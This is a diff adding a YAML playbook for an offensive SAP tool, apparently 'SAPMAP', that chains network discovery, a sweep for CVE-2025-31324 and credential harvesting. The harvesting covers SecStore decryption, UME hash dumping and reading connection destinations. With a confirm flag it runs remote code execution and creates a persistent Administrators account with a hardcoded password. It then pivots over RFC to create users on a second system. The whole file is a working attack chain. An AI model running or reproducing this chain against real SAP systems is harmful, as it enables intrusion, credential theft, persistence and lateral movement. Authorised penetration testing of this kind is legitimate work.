@@ -1,0 +1,86 @@
+# SAPMAP Script: Full Java Attack Chain
+#
+# Usage:
+#   Dry-run (discovery + read-only harvest, exploitation steps skipped):
+#     python3 sapmap.py --script scripts/java_full_chain.yaml
+#
+#   Full run (also performs CVE-2025-31324 RCE + creates a Java user):
+#     python3 sapmap.py --script scripts/java_full_chain.yaml --confirm
+#
+# Stages:
+#   1. Discover SAP systems on the network
+#   2. Sweep every Java / double-stack node for CVE-2025-31324
+#   3. Drive the full Java post-compromise pipeline on the target:
+#        SecStore decrypt -> UME hash dump -> JCo destinations ->
+#        Java business-impact assessment
+#   4. (Optional, --confirm only) Exploit CVE-2025-31324 and create a
+#      UME Administrators user for persistence / pivoting
+#
+# The SJJ target details below assume the demo landscape.  Change
+# `target:` / `add_system` IPs to match your environment.
+
+name: "Java Full Attack Chain"
+description: "Discover -> check CVE-2025-31324 -> SecStore/UME/destinations/impact -> (optional) RCE + user create"
+
+steps:
+  # --- Stage 1: discovery -----------------------------------------------
+  - action: scan
+    targets: "192.168.2.192"
+    mode: fast
+    timeout: 600
+
+  # --- Stage 2: landscape-wide Java vuln sweep --------------------------
+  # Only hits Java / double-stack systems (the GUI route pre-filters),
+  # so pure-ABAP discoveries are not probed for an inapplicable vuln.
+  - action: check_all_cve_31324
+
+  # --- Stage 3: Java post-compromise pipeline ---------------------------
+  # Macro: expands at load time into five sub-steps —
+  #   check_cve_31324 -> java_secstore -> extract_java_hashes ->
+  #   read_java_destinations -> impact_assess_java
+  # All read-only / passive probes; no user creation or RCE happens here.
+  - action: java_pipeline
+    target: SJJ
+
+  # --- Stage 4: exploitation (requires --confirm) -----------------------
+  # Without --confirm these two steps are skipped with a clear log line,
+  # so the playbook can be dry-run end-to-end for reporting purposes and
+  # then re-run with --confirm to land the destructive stage.
+  - action: exploit_cve_31324
+    target: SJJ
+    mode: command
+    command: "whoami"
+
+  - action: create_user_java
+    target: SJJ
+    username: SAPMAP00
+    password: "Andinyougo123!"
+    group: Administrators
+    method: auto
+
+  # Test connection 
+  - action: test_rfc_single 
+    target: SJJ
+    destination: to_S4H
+
+  - action: create_user_via_rfc 
+    target: SJJ
+    destination: to_S4H
+    target_sid: S4H
+
+  - action: impact_assess
+    target: S4H
+    client: "001"
+
+  - action: impact_export
+    target: S4H
+
+     # Analyze trust chains across landscape
+  - action: analyze_chains
+
+# Highlight the most critical chain (index 0)
+  - action: highlight_chain
+    index: 0
+
+  - action: impact_show
+    target: S4H
